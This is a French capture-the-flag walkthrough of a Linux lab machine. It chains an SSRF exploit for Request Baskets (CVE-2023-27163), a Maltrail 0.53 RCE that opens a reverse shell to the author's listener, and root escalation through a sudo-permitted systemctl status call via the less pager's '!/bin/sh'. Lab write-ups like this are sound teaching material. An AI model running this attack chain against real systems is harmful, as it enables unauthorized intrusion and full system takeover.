#linux #easy 
# Recon

## nmap
```
 PORT     STATE SERVICE VERSION
└─$ nmap -Pn -T4 -sV -p- 10.10.11.224
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 16:09 GMT
Warning: 10.10.11.224 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.224 (10.10.11.224)
Host is up (0.21s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
887/tcp   filtered iclcnet_svinfo
8338/tcp  filtered unknown
15496/tcp filtered unknown
50502/tcp filtered unknown
55555/tcp open     unknown
59269/tcp filtered unknown
```

8 Ports sont découverts dont 2 qui sont ouverts. Le Port 22 sur ssh et le port 55555 dont le service est inconnu.
En se connectant sur ce port dans le navigateur on constate qu'une application Web est héberger sur serveur.

Tout juste au pieds de la page on constate que l'application en question est Request-Basquet

Après quelques recherches sur google.
[Request Baskets](https://rbaskets.in/) est un service Web conçu pour creer des points de terminaisons permettant de capturer des requêtes HTTP et faciliter leur inspection via une  interface utilisateur Web simple.

Il existe également un exploit qui exploite une vulnérabilité SSRF dans la version 1.2.1.

Une vulnérabilité SSRF, qui signifie Server-Side Request Forgery, est une faille de sécurité dans laquelle un attaquant peut induire un serveur à effectuer des requêtes vers des ressources internes non autorisées ou à accéder à des informations sensibles à l'intérieur du réseau.
Le mécanisme de base d'une SSRF consiste à persuader le serveur de faire des requêtes HTTP vers des ressources situées à l'intérieur du réseau interne de la cible.

Le nom de la vulnérabilité  liée à cette version est CVE-2023-27163
# exploit
## exploit request-basket app

L'exploitation est assez simple à exécuter, il suffit d'exécuter le script en mettant en argument l'adresse IP et le numéro de port de la cible ainsi que l'adresse et le numero de port  où nous souhaitons rediriger notre requête en interne sur le serveur.
Puisque le protocole http est utilisé sur le port 80, nous allons éssayer d'y accéder.

En gros l'exploit crée un point de terminaison tout en obligeant le serveur à rediriger les requêtes http vers l'adresse local de la cible sur le port 80. 
```
./CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80/
```
## exploit maltrail app
En se connectant sur ce point de terminaison on constate qu'une autre application Web est héberger en interne sur le port 80.
Une fois de plus on peut voir le nom de cette application au pieds de la page.

En faisant une petite recherche sur la version 0.53 de MalTrail. On découvre qu'il existe une vulnérabilité de type RCE qui nous permet d'obtenir un reverse shell sur la cible.

Pour obtenir le shell, je commence d'abord par me mettre en ecoute sur le port 1234,
ensuite j'exécute l'exploite en mettant en argument l'adresse IP de ma machine, le port sur lequel je veux obtenir le shell et l'adresse de la cible.
└─$ 
```
python3 Maltrail-v0.53-Exploit/exploit.py 10.10.16.35 1234 http://10.10.11.224:55555/<basket>
```

# foothold
Maintenant que j'ai un accès sur la cible, je suis connecter en tant que puma.
Pour élever mes privilèges j'exécute la commande `sudo -l` pour vérifier les commandes que j'ai le droit d'exécuter sans mot de passe.
```
$ sudo -l
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
Je découvre que j'ai le droit d'afficher des information sur le service trail en tant que administrateur sans fournir de mot de passe.

En exécutant cette commande en tant que root je constate que les informations sont affichées grace à la commande `Less`.
Heureusement l'interface de la commande Less permet d'executé des commandes.
Il me suffit donc d'écrire `!/bin/sh` et là j'obtient un shell root. 

J'espère que vous avez aimer cette video, n'hesitez pas écrire ce que vous en pensé en commentaire, à mettre un pousse bleu et à vous abonner pour ne pas manquer les prochaines videos. Chao